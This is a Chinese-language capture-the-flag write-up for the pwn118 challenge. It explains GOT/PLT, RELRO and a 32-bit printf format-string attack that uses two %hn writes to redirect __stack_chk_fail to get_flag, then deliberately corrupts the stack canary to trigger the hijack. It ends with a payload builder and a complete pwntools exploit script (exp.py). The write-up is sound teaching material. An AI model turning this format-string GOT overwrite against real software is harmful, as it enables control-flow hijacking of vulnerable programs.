#### 三、核心问题：为什么不能"先泄露 canary 再溢出"？

> [!note] **🎯 旧草稿提出的路线假设**
> 若目标附件确实只有一次 `read()`，且后续格式串写入与 Canary 触发都能成立，那么可以尝试不先泄露 Canary，而是让检查失败后调用的 `__stack_chk_fail` 跳转到候选 `get_flag`。这只是候选思路，附件的调用点、GOT 槽、位置参数与写入结果都还要验证。

旧草稿把 babypie / pwn119 归为两阶段路线，并把 pwn118 记录为**一次 `read()` 的候选样本**；这些题目特征应分别以各自附件确认：

```
read(0, buf, 0xa0);     // 只调用一次！
printf(buf);
// canary check
```

若附件反汇编确认该函数只执行一次 `read()`，随后进入 `printf` 并检查 Canary，那么候选攻击所需数据必须在**这次调用实际读到的字节**里。注意：这不等于网络传输“必定一包读满 `0xa0`”；`read` 可以短读，本地和远程都要用 I/O 同步验证本次到底收到了多少字节。若不先知道 Canary，跨过它的覆盖会让检查失败。

**候选方向：**若前置条件成立，再考虑把 `__stack_chk_fail` 变成转向目标函数的入口。

#### 四、基础知识：GOT / PLT 是怎么工作的？

> **深入阅读：** `GOT_PLT详解`（GOT/PLT 完整原理）· `延迟绑定`（lazy binding）· `保护机制详解`（RELRO）· `格式化字符串详解`

##### 4.1 动态链接与延迟绑定

```
当程序调用 system("cat /ctfshow_flag") 时：

C 代码:    system("cat /ctfshow_flag")
              │
              ▼
          call system@plt          ← 跳到 PLT 表项
              │
              ▼
┌─────────────────────────────────────────┐
│ PLT 表项（system@plt）:                  │
│   jmp *GOT[system]       ← 跳转到 GOT   │
│   push reloc_index                     │
│   jmp resolver             ← 首次调用时  │
└─────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────┐
│ GOT 表项（.got.plt 段）:                  │
│   首次：指向 PLT 第二条指令（触发解析）      │
│   解析后：指向 libc 中 system() 的真实地址   │
└─────────────────────────────────────────┘
```

> [!note] PLT = Procedure Linkage Table，GOT = Global Offset Table
> PLT 是一小段跳板代码，GOT 是动态链接器使用的地址槽。启用 lazy binding 时，函数槽起初可能指向 PLT 的解析路径；首次调用解析后，槽才保存目标函数的运行时地址。立即绑定或 `-fno-plt` 等路径可能不同，应查看目标 ELF 与调用点。本题利用还要求目标 GOT 槽可写；Partial RELRO 的判断需要结合 ELF 和实际映射。

##### 4.2 RELRO 保护级别

| 级别 | GOT 可写？ | 说明 |
|------|-----------|------|
| No RELRO | ✅ 完全可写 | 无保护 |
| **Partial RELRO** | 通常 `.got.plt` 仍可写 | 需核实目标槽位及运行时映射 |
| Full RELRO | ❌ 只读 | 初始化时全部解析完，运行时不改 |

旧草稿记录 `objdump -x pwn118` 显示 `.got.plt` 为 DATA（不是 READONLY），据此提出 Partial RELRO / GOT 可写的判断。该记录尚未由当前目标附件复核；实际写入还取决于具体 GOT 槽、运行时映射和成功定位到其地址参数。

#### 五、漏洞分析

##### 5.1 格式化字符串漏洞

```c
printf(buf);   // 应该写 printf("%s", buf);
```

`buf` 里的内容被当成**格式字符串**。如果 `buf` 里有 `%p`、`%n`、`%hn`……printf 会按格式解析并执行相应操作。

##### 5.2 为什么用 %hn？

> [!note] **🎯 为什么用 %hn 而不是 %n？**
> 在常见 32 位 glibc 题目里，`%n` 通过参数指针写入当前输出字符数；`%hn` / `%hhn` 分别通过指针写较窄的整数。直接把计数撑到完整 32 位地址通常不现实，所以常把 32 位值拆成两个 16 位目标。常见 glibc 下 `%hn` 实际观察到的是计数低 16 位（可按模 `2^16` 理解），并非“最多只能打印 65535 个字符”；超出后计数可回绕。具体行为以目标 libc 验证为准。

| 格式符 | 写入大小 | 适用 |
|--------|---------|------|
| `%n` | `int` 大小（本题候选为 4 字节） | 写当前输出计数；完整 32 位目标常需大量输出 |
| `%hn` | `short` 大小（本题候选为 2 字节） | 常用于拆成两次写低/高 16 位；计数回绕需纳入计算 |
| `%hhn` | `char` 大小（本题候选为 1 字节） | 可逐字节写；次数更多，需逐项计算 |

`%hn` 的目标参数必须是有效的 `short *`。在常见 glibc 利用中写入的是当前已输出字符数的低 16 位；它不是“按 2 字节计数”。若后续目标数值更小，可以按 `2^16` 回绕继续增加输出计数。候选路线选择先写 `0x0804` 再写 `0x8586`，只是因为这两个候选半字按该顺序递增。

##### 5.3 格式化字符串参数在 32 位栈上的位置

32 位 x86 cdecl 调用约定：普通函数参数通过栈传递。`printf(buf)` 只显式传入了格式串参数，没有合法提供后续变参；格式串中的 `%c`、`%hn` 若读取这些不存在的变参，在 C 语言层面属于未定义行为。CTF 利用依赖目标 ABI 和当时栈布局把输入附近的字节解释为变参，因此参数槽位必须对目标附件实测，不能仅由局部变量偏移猜定。

```
调用 printf(buf) 时（仅为 cdecl 的调用者视角示意；实际变参位置须测量）：

              低地址 (esp)
              ┌────────────┐
              │ return addr│  ← call 指令压入
              ├────────────┤
              │ buf 指针   │  ← push buf
              ├────────────┤
              │ 变参候选区 │  ← printf(buf) 并未合法提供这些变参
              │ VA2        │
              │ ...        │
              │ ...        │  ← 输入字节是否映射到这些槽位，要由目标调用现场验证
              │ ...        │
              └────────────┘
              高地址
```

> 旧草稿曾根据 `ebp-0x74` 与 `ebp-0x5c` 的距离推测输入字节可能落在某些变参槽位，并据此写过 `%7$` / `%8$`。这只是**候选假设**：格式串参数的实际读取位置受 `printf` 调用点、编译结果和栈内容影响，局部变量距离本身不足以确认参数序号。不要把这两个序号当作结论；用唯一 marker、逐位置观察和目标附件复测后再填写。

#### 六、候选 GOT 劫持方案的计算

##### 6.1 目标

候选目标是把 `__stack_chk_fail@GOT` 的值改成 `get_flag` 地址；以下符号和地址均待目标附件复核：

```
__stack_chk_fail@GOT (0x08049118):
    原值: 需在目标运行时读取（可能受绑定状态影响）
    候选目标值: 0x08048586 (get_flag)
```

##### 6.2 分两次 %hn 写入

旧草稿中的候选值 `get_flag = 0x08048586`：

```
内存中的 GOT 条目（小端序）：
┌──────────┬──────────┬──────────┬──────────┐
│ GOT+0..1 │ GOT+2..3 │          │          │
│ 低 2 字节  │ 高 2 字节  │          │          │
│ 0x8586   │ 0x0804   │          │          │
└──────────┴──────────┴──────────┴──────────┘

候选拆分顺序：
  第 1 次: 写 0x0804 到 GOT+2（较小值，先写）
  第 2 次: 写 0x8586 到 GOT+0（较大值，后写）
```

##### 6.3 候选计数模型（参数位置待实测）

下面只保留旧推导中的**算术示例**，不代表格式串参数位置或 payload 已验证。正式使用位置参数时，所有消耗参数的转换都应采用一致的位置参数写法；不要混用 `%2044c` 这类非位置转换与 `%N$hn`。而且 `%c` 本身也会消耗一个 `int` 参数，不能只把它理解成“打印空格”。

```
┌─────────────────────────────────────────────────────────────┐
│ buf 内容                                                      │
├──────────┬──────────┬────────────────┬──────────────┬───────┤
│ GOT+2    │ GOT+0    │ %C1$2044c%HI$hn│ %C2$32130c%LO$hn│ \x00 │
│ 地址候选 │ 地址候选 │ 写入计数候选   │ 写入计数候选   │ 终止 │
└──────────┴──────────┴────────────────┴──────────────┴───────┘

字符计数追踪:
  p32(GOT+2) + p32(GOT+0) → 8 字符
  若前 8 个地址字节都被 printf 当普通字符输出且没有 NUL/'%'：计数起点为 8
  %C1$2044c                → 总计再输出 2044 个字符，计数为 8+2044=2052=0x0804
  %HI$hn                   → 候选地把计数低 16 位写到 GOT+2
  %C2$32130c               → 再输出 32130 个字符，计数为 34182=0x8586
  %LO$hn                   → 候选地把计数低 16 位写到 GOT+0
```

这里 `C1`、`C2`、`HI`、`LO` 是**尚待测量的参数序号占位符**，不是可直接粘贴的 printf 语法。`%N$2044c` 的宽度是最小字段宽度；对单字符 `%c`，当宽度大于 1 时总输出长度为 2044（其中通常是 2043 个填充空格和 1 个字符），不是“额外打印 2044 个空格”。第二个转换同理，增加 32130 个输出字符。转换会读取对应的 `int` 参数；具体参数值决定那一个字符是什么，但宽度满足时总字符数按字段宽度计算。

> [!warning] 为什么要小值先写？
> 本候选顺序让输出计数从 2052 增至 34182。若遇到需要写入更小半字的目标，常见 glibc 算法会按 `2^16` 回绕计算所需增量；不能简单说计数不能减少，所以永远必须小值先写。

#### 七、候选路线：GOT 写入与 Canary 触发

候选 Payload 结构（没有经过目标附件验证；参数序号变化会改变格式串长度）：

```
输入字节： [两个候选 GOT 地址][候选格式串][NUL][填充到实测 Canary 偏移][候选破坏 Canary]
                         ↑                         ↑
              printf 在 NUL 处停止解析      偏移与 read 长度均待实测
```

如果目标二进制的偏移、输入协议、参数槽位与 GOT 可写性都符合候选假设，预期控制流才可能是：

```
① read() 尝试读入 payload         ─── 可能短读，须确认实际字节数
② printf 解析格式字符串           ─── 按候选计数模型输出约 34KB 字符（包括每个 `%c` 字段中的字符）
③ printf 遇到 \x00 停止           ─── 后面数据不管
④ 若候选填充值破坏 Canary ──────── 才会进入失败处理路径
⑤ 若目标确实经该 GOT 槽调用且写入成功 ─ 才可能转向 get_flag
⑥ 后续是否执行命令并输出结果 ──────── 尚未在附件中验证
```

> [!tip] 为什么 canary 用 "BBBB" 就行？
> 若目标实测确认 buf 到 canary 的距离为 80 字节，且单次 `read` 确实收到了这些字节，那么在格式串终止符后继续放填充字节可以覆盖 canary。`BBBB` 只是候选破坏值；具体偏移、read 收到的长度及失败处理调用点均需由目标附件验证。

#### 八、候选 payload 生成草稿（未验证，不是可运行 exploit）

下列代码只表达旧推导的构造关系。`ARG_*` 必须通过目标附件实测填写；未填写时脚本会主动停止。即使填写后，也要验证输入读取长度、格式串解析、GOT 写前/写后值、Canary 触发路径和最终输出，不能把“脚本能生成 payload”当作利用成功。

```python
from pwn import context, hexdump, p32

context.arch = "i386"

### 参数序号是目标相关的未知量，先用格式串 marker / GDB 实测再填写。
ARG_C1 = None   # 用于第一个 %c 的位置参数
ARG_HI = None   # 指向 GOT+2 的位置参数
ARG_C2 = None   # 用于第二个 %c 的位置参数
ARG_LO = None   # 指向 GOT+0 的位置参数

if None in (ARG_C1, ARG_HI, ARG_C2, ARG_LO):
    raise RuntimeError("先在目标附件上验证并填写 printf 参数位置；当前只是候选草稿")

### 以下地址、计数与缓冲区到 Canary 的距离也都要对照目标附件确认。
GOT_STACK_CHK_FAIL = 0x08049118
fmt = p32(GOT_STACK_CHK_FAIL + 2) + p32(GOT_STACK_CHK_FAIL)

fmt += f"%{ARG_C1}$2044c%{ARG_HI}$hn".encode()
fmt += f"%{ARG_C2}$32130c%{ARG_LO}$hn".encode()

fmt += b"\x00"                       # printf 格式串终止符
CANARY_OFFSET = 0x50                  # 80；旧草稿候选偏移，须由目标附件核实
if len(fmt) > CANARY_OFFSET:
    raise RuntimeError("格式串已超过候选 Canary 偏移；重新设计布局，不能继续拼接")
payload = fmt.ljust(CANARY_OFFSET, b"A") + b"BBBB"  # 候选覆盖，不代表触发已验证

print(f"候选 payload 长度: {len(payload)}")
print(hexdump(payload))
```

> [!note] 输出里那大片空格
> `%N$2044c` 与 `%M$32130c`（参数位置待实测）各自输出字段宽度指定的字符数；每个字段包含填充空格和一个由参数决定的字符，并非全部都是空格。这里的约 34KB 输出量和脚本均为候选推导，尚未在目标附件上验证。

- [exp.py](exp.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import *
import os
from pathlib import Path
context.arch = "i386"
context.log_level = "info"
GET_FLAG           = 0x08048586
GOT_STACK_CHK_FAIL = 0x08049118
pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn118")
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / "libc/2.23/i386/ld-linux.so.2"
libdir = pwn_root / "libc/2.23/i386/lib"
# get_flag=0x08048586 → 写 0x0804→GOT+2(%7$hn), 0x8586→GOT(%8$hn)
fmt  = p32(GOT_STACK_CHK_FAIL + 2)
fmt += p32(GOT_STACK_CHK_FAIL)
fmt += f"%{0x0804 - 8}c%7$hn".encode()
fmt += f"%{0x8586 - 0x0804}c%8$hn".encode()
fmt += b"\x00"
fmt += b"A" * (80 - len(fmt))   # pad to canary offset
fmt += b"BBBB"                   # corrupt canary → __stack_chk_fail → get_flag
p = process([str(loader), "--library-path", str(libdir), pwn])
p.send(fmt)
print(p.recvall(timeout=5).decode(errors="replace"))
```
